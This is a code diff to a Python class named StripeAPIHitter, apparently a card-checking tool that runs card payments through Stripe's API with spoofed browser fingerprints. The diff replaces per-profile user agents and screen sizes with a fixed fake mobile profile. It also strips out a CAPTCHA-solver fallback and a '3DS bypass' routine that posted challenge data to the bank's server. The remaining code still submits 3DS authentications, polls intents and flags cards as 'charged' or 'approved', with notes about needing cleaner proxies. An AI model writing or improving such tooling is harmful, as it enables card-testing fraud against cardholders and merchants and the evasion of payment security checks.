@@ -1328,13 +1328,14 @@ class StripeAPIHitter:
                                         state = "redirected"
                                         processed_auth = True
                                     elif source:
-                                        # authenticate must match the confirm UA — mismatched UA/dimensions trigger challenge
+                                        # Friend's mobile profile for 3DS authenticate
+                                        _mobile_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                                         auth_headers = {
                                             "accept": "application/json",
                                             "content-type": "application/x-www-form-urlencoded",
                                             "origin": "https://js.stripe.com",
                                             "referer": "https://js.stripe.com/",
-                                            "user-agent": profile["user_agent"]
+                                            "user-agent": _mobile_ua
                                         }
                                         browser = {
                                             "fingerprintAttempted": True,
@@ -1344,11 +1345,11 @@ class StripeAPIHitter:
                                             "browserJavaEnabled": False,
                                             "browserJavascriptEnabled": True,
                                             "browserLanguage": "en-US",
-                                            "browserColorDepth": profile.get("color_depth", "24"),
-                                            "browserScreenHeight": profile.get("screen_height", "1080"),
-                                            "browserScreenWidth": profile.get("screen_width", "1920"),
-                                            "browserTZ": str(random.randint(-480, 540)),
-                                            "browserUserAgent": profile["user_agent"]
+                                            "browserColorDepth": "24",
+                                            "browserScreenHeight": "873",
+                                            "browserScreenWidth": "393",
+                                            "browserTZ": "-300",
+                                            "browserUserAgent": _mobile_ua
                                         }
                                         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
                                         auth_data = {
@@ -1371,203 +1372,48 @@ class StripeAPIHitter:
                                             state = "3DS Attempt failed"
                                         processed_auth = True
 
-                                # Fallback: Run CAPTCHA solver if not authenticated or if challenge/failed states occur
-                                run_captcha_fallback = False
+                                # === Friend's approach: no CAPTCHA solver, treat rqdata as decline ===
                                 if not processed_auth:
                                     if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
-                                        run_captcha_fallback = True
-                                elif state in ("challenge_required", "3DS Attempt failed", None) and (captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {}))):
-                                    run_captcha_fallback = True
-
-                                if run_captcha_fallback:
-                                    if _HAS_3DS_BYPASS:
-                                        try:
-                                            _cap_type = "setup_intent" if is_setup_intent else "payment_intent"
-                                            _cap_result = await attempt_captcha_verification(
-                                                loop, _cffi_session, self.pk_live,
-                                                client_secret, intent_id, _cap_type, sdk, headers, pm_id
-                                            )
-                                            if _cap_result:
-                                                _cs, _cm = _cap_result
-                                                if _cs in ('charged', 'approved'):
-                                                    result['success'] = True
-                                                    result['decline_code'] = _cm
-                                                    return result
-                                                elif _cs in ('declined', 'live_declined'):
-                                                    result['decline_code'] = _cm
-                                                    result['error'] = _cm
-                                                    result['raw_response'] = confirm_json
-                                                    return result
-                                                elif _cs == 'requires_action':
-                                                    # Captcha solved, now let's apply the friend's flow to the new state
-                                                    confirm_json = _cm
-                                                    res = confirm_json.get('payment_intent') or confirm_json.get('setup_intent') or confirm_json
-                                                    if not isinstance(res, dict): res = confirm_json
-                                                    next_action = res.get("next_action", {}) or {}
-                                                    sdk = next_action.get("use_stripe_sdk", {}) or {}
-                                                    source = (
-                                                        sdk.get("three_d_secure_2_source")
-                                                        or sdk.get("source")
-                                                        or next_action.get("source")
-                                                    )
-                                                    captcha_triggered = False
-
-                                                    is_legacy_3ds = (
-                                                        res.get("status") == "requires_source_action"
-                                                        or sdk.get("type") == "three_d_secure_redirect"
-                                                        or next_action.get("type") == "redirect_to_url"
-                                                        or bool(res.get("url"))
-                                                    )
-                                                    if is_legacy_3ds:
-                                                        redirect_url = res.get("url") or sdk.get("stripe_js") or next_action.get("redirect_to_url", {}).get("url")
-                                                        if isinstance(redirect_url, str):
-                                                            redir_headers = {
-                                                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                                                                "user-agent": profile["user_agent"]
-                                                            }
-                                                            await loop.run_in_executor(None, lambda: _cffi_session.get(redirect_url, headers=redir_headers, timeout=15))
-                                                        await asyncio.sleep(2)
-                                                        state = "redirected"
-                                                        processed_auth = True
-                                                    elif source:
-                                                        auth_headers = {
-                                                            "accept": "application/json",
-                                                            "content-type": "application/x-www-form-urlencoded",
-                                                            "origin": "https://js.stripe.com",
-                                                            "referer": "https://js.stripe.com/",
-                                                            "user-agent": profile["user_agent"]
-                                                        }
-                                                        browser = {
-                                                            "fingerprintAttempted": True,
-                                                            "fingerprintData": None,
-                                                            "challengeWindowSize": None,
-                                                            "threeDSCompInd": "Y",
-                                                            "browserJavaEnabled": False,
-                                                            "browserJavascriptEnabled": True,
-                                                            "browserLanguage": "en-US",
-                                                            "browserColorDepth": profile.get("color_depth", "24"),
-                                                            "browserScreenHeight": profile.get("screen_height", "1080"),
-                                                            "browserScreenWidth": profile.get("screen_width", "1920"),
-                                                            "browserTZ": str(random.randint(-480, 540)),
-                                                            "browserUserAgent": profile["user_agent"]
-                                                        }
-                                                        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
-                                                        auth_data = {
-                                                            "source": source,
-                                                            "browser": json.dumps(browser),
-                                                            "one_click_authn_device_support[hosted]": "false",
-                                                            "one_click_authn_device_support[same_origin_frame]": "false",
-                                                            "one_click_authn_device_support[spc_eligible]": "false",
-                                                            "one_click_authn_device_support[webauthn_eligible]": "false",
-                                                            "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
-                                                            "key": pk
-                                                        }
-                                                        auth_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.post(
-                                                            auth_url, headers=auth_headers, data=auth_data, timeout=30))
-                                                        auth_json = {}
-                                                        try:
-                                                            auth_json = auth_resp_raw.json()
-                                                            state = auth_json.get("state")
-                                                        except Exception:
-                                                            state = "3DS Attempt failed"
-                                                        processed_auth = True
-                                        except Exception as _cap_ex:
-                                            print(f"DEBUG: Captcha solver fallback failed: {_cap_ex}")
-
-                                if not processed_auth:
-                                    if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
-                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
-                                        result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
+                                        result['decline_code'] = 'stripe_captcha'
+                                        result['error'] = 'Stripe CAPTCHA triggered — skipping (cleaner proxies needed)'
                                     else:
                                         result['decline_code'] = 'no_3ds_source'
-                                        result['error'] = f'3DS required but no source or redirect URL found'
+                                        result['error'] = '3DS required but no source or redirect URL found'
                                     result['raw_response'] = confirm_json
                                     return result
 
                                 if processed_auth:
-                                    # === POST-CHALLENGE HOOK (Hitchk) ===
+                                    # === Friend's approach: challenge_required = immediate poll, then decline ===
                                     if state == "challenge_required":
-                                        if _HAS_3DS_BYPASS and source:
-                                            try:
-                                                _ch_type = "setup_intent" if is_setup_intent else "payment_intent"
-                                                _ch_headers = {
-                                                    "User-Agent": profile["user_agent"],
-                                                    "Content-Type": "application/x-www-form-urlencoded",
-                                                    "Origin": "https://js.stripe.com",
-                                                    "Referer": "https://js.stripe.com/",
-                                                    "Accept": "application/json",
-                                                }
-                                                # Extract ACS URL and creq from the friend's auth response
-                                                # auth_json is in scope from the friend's authenticate call above
-                                                _acs_url = ""
-                                                _creq = ""
-                                                if isinstance(auth_json, dict):
-                                                    _ares = auth_json.get("ares", {}) or {}
-                                                    _acs_url = _ares.get("acsURL", "") or auth_json.get("acsURL", "")
-                                                    _creq = auth_json.get("creq", "")
-                                                
-                                                _ch_result = None
-                                                if _acs_url and _creq:
-                                                    # ACS data available — post creq directly to bank
-                                                    print(f"DEBUG: Challenge auto-solve: ACS={_acs_url[:50]}, creq={len(_creq)} chars")
-                                                    _ch_result = await attempt_3ds2_challenge(
-                                                        loop, _cffi_session, self.pk_live,
-                                                        client_secret, intent_id, _ch_type,
-                                                        _acs_url, _creq, source, _ch_headers
-                                                    )
-                                                else:
-                                                    # No ACS data — try polling in case it auto-resolved
-                                                    print(f"DEBUG: No ACS data in auth_json, polling intent status...")
-                                                    _ch_result = await poll_intent_status(
-                                                        loop, _cffi_session, self.pk_live,
-                                                        client_secret, intent_id, _ch_type, _ch_headers
-                                                    )
-                                                
-                                                if _ch_result:
-                                                    _cs, _cm = _ch_result
-                                                    if _cs in ('charged', 'approved'):
-                                                        result['success'] = True
-                                                        result['decline_code'] = _cm
-                                                        return result
-                                                    elif _cs in ('declined', 'live_declined'):
-                                                        result['decline_code'] = _cm
-                                                        result['error'] = _cm
-                                                        result['raw_response'] = confirm_json
-                                                        return result
-                                            except Exception as _ch_ex:
-                                                print(f"DEBUG: Post-challenge bypass failed: {_ch_ex}")
-                                        # Final poll before giving up — bank may have auto-approved
+                                        # Single immediate poll — bank may have auto-approved (frictionless)
+                                        is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
+                                        intent_endpoint = "setup_intents" if is_setup else "payment_intents"
+                                        poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
+                                        poll_headers = {
+                                            "accept": "application/json",
+                                            "origin": "https://js.stripe.com",
+                                            "referer": "https://js.stripe.com/"
+                                        }
                                         try:
-                                            _final_poll_type = "setup_intent" if is_setup_intent else "payment_intent"
-                                            _final_poll_headers = {
-                                                "User-Agent": profile["user_agent"],
-                                                "Accept": "application/json",
-                                                "Origin": "https://js.stripe.com",
-                                                "Referer": "https://js.stripe.com/",
-                                            }
-                                            if _HAS_3DS_BYPASS:
-                                                _fp_result = await poll_intent_status(
-                                                    loop, _cffi_session, self.pk_live,
-                                                    client_secret, intent_id, _final_poll_type, _final_poll_headers
-                                                )
-                                                if _fp_result:
-                                                    _fps, _fpm = _fp_result
-                                                    if _fps in ('charged', 'approved'):
-                                                        result['success'] = True
-                                                        result['decline_code'] = _fpm
-                                                        return result
-                                                    elif _fps in ('declined', 'live_declined'):
-                                                        result['decline_code'] = _fpm
-                                                        result['error'] = _fpm
-                                                        result['raw_response'] = confirm_json
-                                                        return result
-                                        except Exception as _fp_ex:
-                                            print(f"DEBUG: Final poll failed: {_fp_ex}")
+                                            poll_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.get(
+                                                poll_url, headers=poll_headers, timeout=30))
+                                            poll_json = poll_resp_raw.json()
+                                            if poll_json.get('status') in ['succeeded', 'requires_capture', 'complete']:
+                                                result['success'] = True
+                                                receipt_url = find_receipt_url(poll_json)
+                                                if receipt_url:
+                                                    result['receipt_url'] = receipt_url
+                                                return result
+                                        except Exception:
+                                            pass
+                                        # Not auto-approved — treat as decline like friend does
                                         result['decline_code'] = 'challenge_required'
                                         result['error'] = 'challenge_required'
                                         result['raw_response'] = confirm_json
                                         return result
 
+                                    # Standard poll after successful authenticate (state != challenge_required)
                                     is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
                                     intent_endpoint = "setup_intents" if is_setup else "payment_intents"
                                     poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
@@ -1594,9 +1440,6 @@ class StripeAPIHitter:
                                     if isinstance(err, dict) and err.get('message'):
                                         result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                         result['error'] = err.get('message', 'Unknown error')
-                                    elif captcha_triggered:
-                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
-                                        result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
                                     else:
                                         result['decline_code'] = status_2 or '3ds_unknown'
                                         result['error'] = f"3ds_challenge_unresolved"
